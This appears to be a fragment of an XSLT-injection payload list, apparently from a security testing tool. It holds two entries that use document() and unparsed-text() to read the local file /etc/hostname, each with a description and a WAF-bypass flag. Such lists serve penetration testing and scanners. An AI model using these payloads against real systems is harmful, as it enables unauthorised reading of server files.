        {"payload": "<xsl:value-of select=\"document('/etc/hostname')\"/>", "description": "document() local file read — hostname", "waf_bypass": false},
        {"payload": "<xsl:value-of select=\"unparsed-text('/etc/hostname','utf-8')\"/>", "description": "XSLT 2.0 unparsed-text file read — hostname", "waf_bypass": false},
